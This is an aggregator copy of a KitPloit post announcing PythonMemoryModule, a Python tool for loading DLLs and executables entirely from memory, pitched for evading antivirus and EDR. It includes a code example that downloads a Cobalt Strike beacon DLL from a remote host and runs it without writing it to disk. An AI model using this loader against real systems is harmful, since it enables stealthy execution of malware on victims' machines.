---
title: PythonMemoryModule - Pure-Python Implementation Of MemoryModule Technique To Load Dll And Unmanaged Exe Entirely From Memory
url: https://buaq.net/go-168165.html
source: unSafe.sh - 不安全
date: 2023-06-11
fetch_date: 2025-10-04T11:44:41.239800
---

# PythonMemoryModule - Pure-Python Implementation Of MemoryModule Technique To Load Dll And Unmanaged Exe Entirely From Memory

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/6617e4dd2ac191390d15b67badfdf927.jpg)

PythonMemoryModule - Pure-Python Implementation Of MemoryModule Technique To Load Dll And Unmanaged Exe Entirely From Memory

"Python memory module" AI generated pic - hotpot.ai pure-python implementation of Memory
*2023-6-10 20:30:0
Author: [www.kitploit.com(查看原文)](/jump-168165.htm)
阅读量:43
收藏*

---

[![](https://blogger.googleusercontent.com/img/a/AVvXsEint3s2nJcg6ZG1nOGmWXsY09kqcIabGUghd3Teu-9H_IiA2E7nKke8rQL7MShp_DOXDs2bOlvxf1aiNDVwsaiBBGQLcbMCoMtV8hLCnRXfU7pSDmH_a0BQIXMhenh13neMDXJRO5GLdjvMJaqJueKK9PQHaPpqwbDRObRUNfOb8zBjRd0x0utjHyxRTw=w400-h400)](https://blogger.googleusercontent.com/img/a/AVvXsEint3s2nJcg6ZG1nOGmWXsY09kqcIabGUghd3Teu-9H_IiA2E7nKke8rQL7MShp_DOXDs2bOlvxf1aiNDVwsaiBBGQLcbMCoMtV8hLCnRXfU7pSDmH_a0BQIXMhenh13neMDXJRO5GLdjvMJaqJueKK9PQHaPpqwbDRObRUNfOb8zBjRd0x0utjHyxRTw)

pure-python implementation of MemoryModule technique to load a dll or unmanaged exe entirely from memory

PythonMemoryModule is a Python ctypes porting of the [MemoryModule](https://www.joachim-bauch.de/tutorials/loading-a-dll-from-memory/ "MemoryModule") technique originally published by [Joachim Bauch](https://github.com/fancycode/MemoryModule "Joachim Bauch"). It can load a dll or unmanaged exe using Python without requiring the use of an external library (pyd). It leverages [pefile](https://github.com/erocarrera/pefile "pefile") to parse PE headers and ctypes.

The tool was originally thought to be used as a [Pyramid](https://github.com/naksyn/Pyramid/ "Pyramid") module to provide evasion against AV/EDR by loading dll/exe payloads in python.exe entirely from memory, however other use-cases are possible (IP protection, pyds in-memory loading, spinoffs for other stealthier techniques) so I decided to create a dedicated repo.

1. It basically allows to use the MemoryModule techinque entirely in Python interpreted language, enabling the loading of a dll from a memory buffer using the stock signed python.exe binary without requiring dropping on disk external code/libraries (such as [pymemorymodule](https://pypi.org/project/pymemorymodule/ "pymemorymodule") bindings) that can be flagged by AV/EDRs or can raise user's suspicion.
2. Using MemoryModule technique in compiled languages loaders would require to embed MemoryModule code within the loaders themselves. This can be avoided using Python interpreted language and PythonMemoryModule since the code can be executed dynamically and in memory.
3. you can get some level of Intellectual Property [protection](https://www.kitploit.com/search/label/Protection "protection") by dynamically in-memory downloading, decrypting and loading dlls that should be hidden from prying eyes. Bear in mind that the dlls can be still recovered from memory and reverse-engineered, but at least it would require some more effort by the attacker.
4. you can load a stageless payload dll without performing [injection](https://www.kitploit.com/search/label/Injection "injection") or shellcode execution. The loading process mimics the LoadLibrary [Windows API](https://www.kitploit.com/search/label/Windows%20API "Windows API") (which takes a path on disk as input) without actually calling it and operating in memory.

In the following example a [Cobalt Strike](https://www.kitploit.com/search/label/Cobalt%20Strike "Cobalt Strike") stageless beacon dll is downloaded (not saved on disk), loaded in memory and started by calling the entrypoint.

```
import urllib.request
import ctypes
import pythonmemorymodule
request = urllib.request.Request('http://192.168.1.2/beacon.dll')
result = urllib.request.urlopen(request)
buf=result.read()
dll = pythonmemorymodule.MemoryModule(data=buf, debug=True)
startDll = dll.get_proc_addr('StartW')
assert startDll()
#dll.free_library()
```

Note: if you use staging in your malleable profile the dll would not be able to load with LoadLibrary, hence MemoryModule won't work.

[![](https://blogger.googleusercontent.com/img/a/AVvXsEibzYqvgZc_lWrV7PJYoLjRmg_HPO3tmDA99xUJrHpKAEfgPv4mnePz8RkIM6XYTL1bLIat--e3j9t4RgJlr4IYtjYd3f3R8-or2LTsU_osl2PI0YRaxsn9HaljhbD6Y51dUu6rTsMVrgH6qt-2dJerOA0KMFJ55_Ey5VCilGphoa5TTA6YBoGwHrpsGw=w640-h282)](https://blogger.googleusercontent.com/img/a/AVvXsEibzYqvgZc_lWrV7PJYoLjRmg_HPO3tmDA99xUJrHpKAEfgPv4mnePz8RkIM6XYTL1bLIat--e3j9t4RgJlr4IYtjYd3f3R8-or2LTsU_osl2PI0YRaxsn9HaljhbD6Y51dUu6rTsMVrgH6qt-2dJerOA0KMFJ55_Ey5VCilGphoa5TTA6YBoGwHrpsGw)

Using the MemoryModule technique will mostly respect the sections' permissions of the target DLL and avoid the noisy RWX approach. However within the program memory there will be a private commit not backed by a dll on disk and this is a MemoryModule telltale.

### Future improvements

1. add support for argument parsing.
2. add support (basic) for .NET [assemblies](https://www.kitploit.com/search/label/Assemblies "assemblies") execution.

PythonMemoryModule - Pure-Python Implementation Of MemoryModule Technique To Load Dll And Unmanaged Exe Entirely From Memory
![PythonMemoryModule - Pure-Python Implementation Of MemoryModule Technique To Load Dll And Unmanaged Exe Entirely From Memory](https://blogger.googleusercontent.com/img/a/AVvXsEint3s2nJcg6ZG1nOGmWXsY09kqcIabGUghd3Teu-9H_IiA2E7nKke8rQL7MShp_DOXDs2bOlvxf1aiNDVwsaiBBGQLcbMCoMtV8hLCnRXfU7pSDmH_a0BQIXMhenh13neMDXJRO5GLdjvMJaqJueKK9PQHaPpqwbDRObRUNfOb8zBjRd0x0utjHyxRTw=s72-w400-c-h400)
Reviewed by Zion3R
on
8:30 AM
Rating: 5

文章来源: http://www.kitploit.com/2023/06/pythonmemorymodule-pure-python.html
 如有侵权请联系:admin#unsafe.sh

© [unSafe.sh - 不安全](https://unsafe.sh) Powered By [PaperCache](https://github.com/code-scan/PaperCache)

* admin#unsafe.sh
* [安全马克](https://aq.mk)
* [星际黑客](https://xj.hk)
* [T00ls](https://t00ls.net)